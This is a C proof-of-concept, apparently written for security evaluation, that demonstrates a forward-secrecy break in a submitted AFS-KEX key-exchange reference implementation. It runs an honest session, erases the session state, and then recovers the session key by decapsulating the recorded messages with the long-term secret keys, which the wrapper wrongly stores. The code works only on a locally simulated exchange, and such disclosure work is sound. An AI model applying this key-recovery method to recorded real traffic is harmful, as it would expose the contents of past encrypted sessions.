/*
 * Completed-session forward-secrecy break for AFS-KEX (kex-02).
 *
 * The NGCC API calls pka/pkb and ska/skb the long-term keys.  The submitted
 * wrapper nevertheless serializes each session's composite KEM secret key as
 * the first half of ska/skb.  A passive attacker records m1 and m2, waits for
 * both long-term secret keys to be compromised, decapsulates the two recorded
 * ciphertexts, and applies the public session KDF.  The result is the exact
 * key of the already completed and erased session.
 *
 * This driver links one unmodified submitted reference implementation; its
 * build target selects C128, C256, or C512.
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "KEX_AlgorithmInstance.h"
#include "auxfunc.h"
#include "drng.h"
#include "kem.h"
#include "params.h"

DRNG_ctx drng_algorithm;

static void die(const char *what)
{
    fprintf(stderr, "reproduce_pfs_break: %s\n", what);
    exit(2);
}

static void require_nonnegative(int rc, const char *what)
{
    if (rc < 0) die(what);
}

static void session_kdf(unsigned char out[KYBER_SYMBYTES],
                        const unsigned char kb[KYBER_SYMBYTES],
                        const unsigned char ka[KYBER_SYMBYTES])
{
    unsigned char in[2 * KYBER_SYMBYTES];
    unsigned char expanded[3 * KYBER_SYMBYTES];

    memcpy(in, kb, KYBER_SYMBYTES);
    memcpy(in + KYBER_SYMBYTES, ka, KYBER_SYMBYTES);
    if (pseudoXOF(sizeof expanded * 8ULL, in, sizeof in * 8ULL, expanded) != 0)
        die("session KDF failed");
    memcpy(out, expanded, KYBER_SYMBYTES);
}

static void print_hex(const unsigned char *x, size_t n)
{
    for (size_t i = 0; i < n; i++) printf("%02x", x[i]);
}

int main(void)
{
    const size_t pk_cap = 2 * KYBER_PUBLICKEYBYTES;
    const size_t sk_cap = 2 * KYBER_SECRETKEYBYTES;
    const size_t st_cap = 4 * KYBER_SYMBYTES;
    const size_t msg_cap = 2 * KYBER_CIPHERTEXTBYTES + 2 * KYBER_SYMBYTES;
    unsigned char seed[55];
    unsigned char *pka = calloc(pk_cap, 1), *pkb = calloc(pk_cap, 1);
    unsigned char *ska = calloc(sk_cap, 1), *skb = calloc(sk_cap, 1);
    unsigned char *sta = calloc(st_cap, 1), *stb = calloc(st_cap, 1);
    unsigned char *m1 = calloc(msg_cap, 1), *m2 = calloc(msg_cap, 1);
    unsigned char *m3 = calloc(msg_cap, 1), *m4 = calloc(msg_cap, 1);
    unsigned char honest_a[KYBER_SYMBYTES], honest_b[KYBER_SYMBYTES];
    unsigned char kb[KYBER_SYMBYTES], ka[KYBER_SYMBYTES];
    unsigned char recovered[KYBER_SYMBYTES], control[KYBER_SYMBYTES];
    unsigned char kb_static[KYBER_SYMBYTES], ka_static[KYBER_SYMBYTES];
    unsigned long long pka_len = pk_cap, pkb_len = pk_cap;
    unsigned long long ska_len = sk_cap, skb_len = sk_cap;
    unsigned long long sta_len = st_cap, stb_len = st_cap;
    unsigned long long m1_len = msg_cap, m2_len = msg_cap;
    unsigned long long m3_len = msg_cap, m4_len = 0;
    unsigned long long honest_a_len = sizeof honest_a;
    unsigned long long honest_b_len = sizeof honest_b;

    if (!pka || !pkb || !ska || !skb || !sta || !stb ||
        !m1 || !m2 || !m3 || !m4)
        die("allocation failed");
    for (size_t i = 0; i < sizeof seed; i++)
        seed[i] = (unsigned char)(0x42u + 29u * i);
    if (init_random_number(&drng_algorithm, seed, sizeof seed) != 0)
        die("DRNG initialization failed");

    require_nonnegative(kex_init_a(pka, &pka_len, ska, &ska_len,
                                   sta, &sta_len), "initiator initialization failed");
    require_nonnegative(kex_init_b(pkb, &pkb_len, skb, &skb_len,
                                   stb, &stb_len), "responder initialization failed");
    require_nonnegative(kex_generate_pass1_msg_a(ska, ska_len, pkb, pkb_len,
                                                  sta, &sta_len, m1, &m1_len),
                        "pass 1 failed");
    require_nonnegative(kex_generate_pass2_msg_b(skb, skb_len, pka, pka_len,
                                                  m1, m1_len, stb, &stb_len,
                                                  m2, &m2_len), "pass 2 failed");
    require_nonnegative(kex_generate_pass3_msg_a(ska, ska_len, pkb, pkb_len,
                                                  m2, m2_len, sta, &sta_len,
                                                  m3, &m3_len), "pass 3 failed");
    require_nonnegative(kex_generate_pass4_msg_b(skb, skb_len, pka, pka_len,
                                                  m3, m3_len, stb, &stb_len,
                                                  m4, &m4_len), "pass 4 failed");
    require_nonnegative(kex_derive_ss_a(ska, ska_len, pkb, pkb_len,
                                        m4, m4_len, sta, sta_len,
                                        honest_a, &honest_a_len),
                        "initiator derivation failed");
    require_nonnegative(kex_derive_ss_b(skb, skb_len, pka, pka_len,
                                        m3, m3_len, stb, stb_len,
                                        honest_b, &honest_b_len),
                        "responder derivation failed");
    if (honest_a_len != KYBER_SYMBYTES || honest_b_len != KYBER_SYMBYTES ||
        memcmp(honest_a, honest_b, KYBER_SYMBYTES) != 0)
        die("honest parties did not agree");

    /* The session is complete.  Erase all session state; retain only the
     * passive transcript and the long-term keys compromised afterward. */
    memset(sta, 0, st_cap);
    memset(stb, 0, st_cap);

    /* m1 is ct_B and m2 begins with ct_A.  The first serialized KEM key in
     * each API long-term secret is the corresponding composite secret key. */
    crypto_kem_dec(kb, m1, skb);
    crypto_kem_dec(ka, m2, ska);
    session_kdf(recovered, kb, ka);

    /* Control: the actual static KEM keys are the second halves.  They cannot
     * decapsulate ciphertexts addressed to the composite public keys. */
    crypto_kem_dec(kb_static, m1, skb + KYBER_SECRETKEYBYTES);
    crypto_kem_dec(ka_static, m2, ska + KYBER_SECRETKEYBYTES);
    session_kdf(control, kb_static, ka_static);

    if (memcmp(recovered, honest_a, KYBER_SYMBYTES) != 0) {
        printf("ATTACK kex-pfs-recovery %s NOT-CONFIRMED recovered key differs\n",
               ALGORITHM_INSTANCE);
        return 1;
    }
    if (memcmp(control, honest_a, KYBER_SYMBYTES) == 0)
        die("static-key control unexpectedly recovered the session key");

    printf("ATTACK kex-pfs-recovery %s CONFIRMED ", ALGORITHM_INSTANCE);
    printf("recorded m1/m2 plus later API long-term-key compromise recovered erased session key ");
    print_hex(recovered, sizeof recovered);
    printf(" (static-only control differs)\n");

    free(m4); free(m3); free(m2); free(m1);
    free(stb); free(sta); free(skb); free(ska); free(pkb); free(pka);
    return 0;
}
